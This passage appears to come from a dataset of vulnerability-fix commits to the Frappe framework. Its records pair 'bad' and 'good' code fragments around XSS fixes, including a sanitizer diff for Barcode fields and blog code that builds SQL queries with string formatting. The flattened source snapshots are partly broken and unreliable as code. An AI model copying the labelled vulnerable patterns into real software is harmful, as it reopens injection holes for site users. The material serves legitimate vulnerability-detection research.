Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"}}, "msg": "fix(blog): Fix possible reflected XSS attack vector"}, "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {"url": "https://api.github.com/repos/omirajkar/bench_frappe/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "html_url": "https://github.com/omirajkar/bench_frappe/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "keyword": "XSS fix", "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "message": "", "files": {"/frappe/core/doctype/doctype/doctype.py": {"changes": [{"diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ", "add": 0, "remove": 1, "filename": "/frappe/core/doctype/doctype/doctype.py", "badparts": ["\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"], "goodparts": []}]}, "/frappe/model/base_document.py": {"changes": [{"diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "add": 1, "remove": 1, "filename": "/frappe/model/base_document.py", "badparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"], "goodparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"]}], "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, 